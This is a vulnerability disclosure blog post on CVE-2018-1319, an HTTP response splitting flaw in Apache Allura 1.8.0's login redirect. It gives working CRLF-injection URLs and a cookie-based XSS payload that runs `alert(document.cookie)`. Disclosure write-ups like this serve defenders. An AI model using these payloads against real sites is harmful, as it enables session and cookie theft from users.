---
title: "XSS via HTTP response splitting in Apache Allura 1.8.0 (CVE-2018-1319)"
layout: post
description: Exploiting an HTTP response splitting to get cookie-based XSS.
date: 2020-02-09
permalink: /2020/02/09/xss-via-http-response-splitting-in-apache-allura-1.8.0/
img: /assets/posts/2020/02/10/allura.png
imgcredit: ""
---
Timeline:
- 25 Feb 2018: Contacted vendor, CVE ID requested
- 15 Mar 2018: <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2018-1319">CVE-2018-1319</a> assigned
- 09 Feb 2020: This post is published

<br>
<hr>
<br>
## Introduction
While looking for Bitbucket alternatives, I came across the Apache Allura project. Their <a href="https://allura.apache.org/" target="_blank">official documentation</a> describes it as:

> an open source implementation of a software forge, a web site that manages source code repositories, bug reports, discussions, wiki pages, blogs, and more for any number of individual projects.

Getting Allura up and running was easy since the project is <a href="https://forge-allura.apache.org/docs/getting_started/installation.html" target="_blank">very well documented</a>. This allowed me to quickly try things with their code. Running ZAP against my local instance took no time, and ZAP reported that it was able to split HTTP responses by using `%0D%0A` in the HTTP GET parameter `return_to`, in the authentication redirection URL `/auth/?return_to=/`. Tipically, this "return to" functionality is useful to redirect unauthenhticated users to certain resource once they unauthenticate. So when attempting to access a protected resource without a valid session, Allura will:

1. Realize that the user is not authenticated
2. Take the user to the login page while using the `return_to` parameter to
   remember what URL was requested first
3. If the user authenticates successfully, Allura redirects the browser to
   whatever `return_to` pointed to, by using an HTTP `Location` header

<br>
<hr>
<br>
## Exploiting
To get an arbitrary header back from Allura 1.8.0 you must:
1. Create a crafted URL such as `/auth/?return_to=/%0D%0AFoo:%20Bar`
2. Visit the URL
3. Successfully log in
<br>

When dealing with HTTP response splitting, an "easy win" when argumenting why this should be addressed is that attackers could redirect victims to a phishing website by using the ``Location`` HTTP header. In this case, the crafed URL would look like so:
<br>

`/auth/?return_to=/%0D%0ALocation:%20https://example.com`
<br>

However, the normal functionality of Allura 1.8.0 is to already construct a legitimate `Location` header, so injecting a new one will result in the HTTP response having two of them, and modern web browser will refuse to process such responses.
<br>

Another attack vector, which led to the creation of <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2018-1319">CVE-2018-1319</a>, is to find vulnerabilities in code that handles data coming from the HTTP headers, such as cookie-handling code. To set an arbitrary cookie, the URL would look like this:

`/auth/?return_to=/%0D%0ASet-Cookie:%20Foo%3DBar`
<br>

Allura uses the <a href="https://pypi.org/project/WebFlash/#history">WebFlash</a> component to display feedback messages whenever certain actions are performed by a logged-in user (e.g. in the pages under `/auth/user_info/contacts/`). These messages are communicated to the front-end via the `webflash` cookie. For example, editing your profile will set the following cookie:

{% highlight bash %}
webflash=%7B
  %22status%22%3A%20%22ok%22%2C%20
  %22message%22%3A%20%22Your%20personal%20data%20was%20successfully%20updated%21%22
%7D;
{% endhighlight %}

Whose URL-decoded value is:
{% highlight javascript %}
webflash={
  "status": "ok",
  "message": "Your personal data was successfully updated!"
};
{% endhighlight %}

Which generates the following HTML code:
{% highlight html %}
<script type="text/javascript">
  $('#messages').notify('Your personal data was successfully updated!', {
    status: 'ok'
  });
</script>
{% endhighlight %}

And shows the following flash message in the front-end:
<br>
<center>
<img width="66%" height="66%" src="/assets/posts/2020/02/10/webflash.png" />
</center>

This means that whatever is in the `webflash` cookie will be picked up by the code generating these messages. To trigger XSS here, the  paylaod for the cookie would look like this:
{% highlight bash %}
{"status":"a'})</script><script>alert(document.cookie)//","message":"xss"}
{% endhighlight %}

Note how the `status` attribute contains the JavaScript payload up to `//`. This will make the computed HTML page looke like this:
{% highlight html %}
<script type="text/javascript">
  $('#messages').notify('xss', {
    status: 'a'
  })
</script>
<script>
  alert(document.cookie)//'});
</script>
{% endhighlight %}

Assembling everything together, the crafted URL would contain the URL-encoded payload (twice), and would look like this:
{% highlight bash %}
/auth/?return_to=/auth/user_info/contacts/%0D%0A
  Set-Cookie:%20webflash%3D%257B
    %2522status%2522%253A%2522a%2527%257D)
    %253C%252Fscript%253E%253Cscript%253Ealert(document.cookie)
    %252F%252F%2522%252C%2522message%2522%253A%2522xss%2522%257D
{% endhighlight %}

PoC:
<br>
<center>
<img src="/assets/posts/2020/02/10/allura_xss.gif" />
</center>
